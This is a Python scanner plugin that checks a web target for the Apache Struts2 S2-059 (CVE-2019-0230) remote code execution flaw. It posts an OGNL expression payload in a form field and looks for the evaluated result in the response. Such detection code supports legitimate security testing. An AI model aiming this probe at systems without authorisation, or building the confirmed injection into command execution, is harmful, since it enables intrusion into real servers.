#!/usr/bin/env python3

import re
from app.lib.utils.request import request

class S2_059_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-059漏洞,又名CVE-2019-0230漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - Struts 2.5.20',
            'date': '2020-08-11',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded"
        }
       
        self.payload = {
            'skillName': '%{11*11}',
            'url': '/s2_059_war_exploded/index.action'
        }
    
    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """
        
        try:
            check_req = request.post(self.url, data = self.payload, headers = self.headers)
            check_str = re.sub('\n', '', check_req.text)
            result = re.findall('label id="(.*?)">', check_str)
            if '121' in result[0]:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_059 = S2_059_BaseVerify('http://localhost:8080/s2_059_war_exploded/index.action')
    print(S2_059.run())